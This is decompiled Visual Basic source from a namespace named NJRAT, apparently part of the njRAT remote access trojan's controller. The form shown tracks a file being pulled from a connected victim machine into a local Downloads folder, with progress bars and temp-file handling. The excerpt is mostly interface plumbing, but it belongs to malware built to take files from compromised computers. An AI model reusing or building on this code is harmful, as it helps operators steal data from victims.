Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000010 RID: 16
	<DesignerGenerated()>
	Public Partial Class DW
		Inherits Form

		' Token: 0x06000152 RID: 338 RVA: 0x00151F48 File Offset: 0x00150348
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = DW.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = DW.__ENCList.Count = DW.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = DW.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = DW.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								DW.__ENCList(num) = DW.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					DW.__ENCList.RemoveRange(num, DW.__ENCList.Count - num)
					DW.__ENCList.Capacity = DW.__ENCList.Count
				End If
				DW.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700007C RID: 124
		' (get) Token: 0x06000155 RID: 341 RVA: 0x001524AC File Offset: 0x001508AC
		' (set) Token: 0x06000156 RID: 342 RVA: 0x001524C4 File Offset: 0x001508C4
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x1700007D RID: 125
		' (get) Token: 0x06000157 RID: 343 RVA: 0x001524D0 File Offset: 0x001508D0
		' (set) Token: 0x06000158 RID: 344 RVA: 0x001524E8 File Offset: 0x001508E8
		Friend Overridable Property Lv1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._Lv1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._Lv1 = value
			End Set
		End Property

		' Token: 0x1700007E RID: 126
		' (get) Token: 0x06000159 RID: 345 RVA: 0x001524F4 File Offset: 0x001508F4
		' (set) Token: 0x0600015A RID: 346 RVA: 0x0015250C File Offset: 0x0015090C
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700007F RID: 127
		' (get) Token: 0x0600015B RID: 347 RVA: 0x0015256C File Offset: 0x0015096C
		' (set) Token: 0x0600015C RID: 348 RVA: 0x00152584 File Offset: 0x00150984
		Friend Overridable Property Timer1 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim flag As Boolean = Me._Timer1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Timer1.Tick, value2
				End If
				Me._Timer1 = value
				flag = (Me._Timer1 IsNot Nothing)
				If flag Then
					AddHandler Me._Timer1.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000080 RID: 128
		' (get) Token: 0x0600015D RID: 349 RVA: 0x001525E4 File Offset: 0x001509E4
		' (set) Token: 0x0600015E RID: 350 RVA: 0x001525FC File Offset: 0x001509FC
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x17000081 RID: 129
		' (get) Token: 0x0600015F RID: 351 RVA: 0x00152608 File Offset: 0x00150A08
		' (set) Token: 0x06000160 RID: 352 RVA: 0x00152620 File Offset: 0x00150A20
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x06000161 RID: 353 RVA: 0x0015262C File Offset: 0x00150A2C
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.DW_Load
			AddHandler MyBase.FormClosing, AddressOf Me.DW_FormClosing
			DW.__ENCAddToList(Me)
			Me.os = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000162 RID: 354 RVA: 0x00152680 File Offset: 0x00150A80
		Private Sub DW_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Me.FS.Close()
			Catch ex As Exception
			End Try
			Try
				Me.FS.Dispose()
			Catch ex2 As Exception
			End Try
			Try
				File.Delete(Me.tmp)
			Catch ex3 As Exception
			End Try
			Me.Button1.Enabled = False
			Me.c.CN = False
		End Sub

		' Token: 0x06000163 RID: 355 RVA: 0x00152730 File Offset: 0x00150B30
		Private Sub DW_Load(sender As Object, e As EventArgs)
			Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)), " - ")), Class6.smethod_16(Me.FN))))
			Me.ProgressBar1.Maximum = Me.SZ
			Me.folder = Me.osk.Folder + "Downloads\"
			Dim flag As Boolean = Not Directory.Exists(Me.folder)
			If flag Then
				Directory.CreateDirectory(Me.folder)
			End If
			Me.folder += New FileInfo(Class6.smethod_16(Me.FN)).Name
			Me.Lv1.Items(0).SubItems(0).Text = New FileInfo(Class6.smethod_16(Me.FN)).Name
			Me.Lv1.Items(1).SubItems(0).Text = Class6.smethod_17(CLng(Me.SZ))
			Do
				Me.tmp = Interaction.Environ("temp") + "\njfm_" + Class6.smethod_6(10)
			Loop While File.Exists(Me.tmp)
			Me.FS = New FileStream(Me.tmp, FileMode.Append)
			Me.Lv1.Items(2).SubItems(0).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
			Me.os = Me.ProgressBar1.Value
			Me.Lv1.Items(3).SubItems(0).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Me.Lv1.method_3()
			Me.Timer1.Enabled = True
		End Sub

		' Token: 0x06000164 RID: 356 RVA: 0x00152938 File Offset: 0x00150D38
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Me.Lv1.Items(2).SubItems(1).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
				Me.os = Me.ProgressBar1.Value
				Me.Lv1.Items(3).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000165 RID: 357 RVA: 0x001529E8 File Offset: 0x00150DE8
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Stop", False) = 0
			If flag Then
				Me.FS.Close()
				Me.FS.Dispose()
				File.Delete(Me.tmp)
				Me.Button1.Enabled = False
				Me.c.CN = False
				Me.Close()
			Else
				Me.FS.Close()
				Me.FS.Dispose()
				File.Move(Me.tmp, Me.folder)
			End If
		End Sub

		' Token: 0x0400009F RID: 159
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040000A1 RID: 161
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x040000A2 RID: 162
		<AccessedThroughProperty("Lv1")>
		Private _Lv1 As GClass9

		' Token: 0x040000A3 RID: 163
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040000A4 RID: 164
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As Timer

		' Token: 0x040000A5 RID: 165
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x040000A6 RID: 166
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x040000A7 RID: 167
		Public c As Client

		' Token: 0x040000A8 RID: 168
		Public FN As String

		' Token: 0x040000A9 RID: 169
		Public folder As String

		' Token: 0x040000AA RID: 170
		Public FS As FileStream

		' Token: 0x040000AB RID: 171
		Public os As Integer

		' Token: 0x040000AC RID: 172
		Public osk As Client

		' Token: 0x040000AD RID: 173
		Public SZ As Integer

		' Token: 0x040000AE RID: 174
		Public tmp As String
	End Class
End Namespace
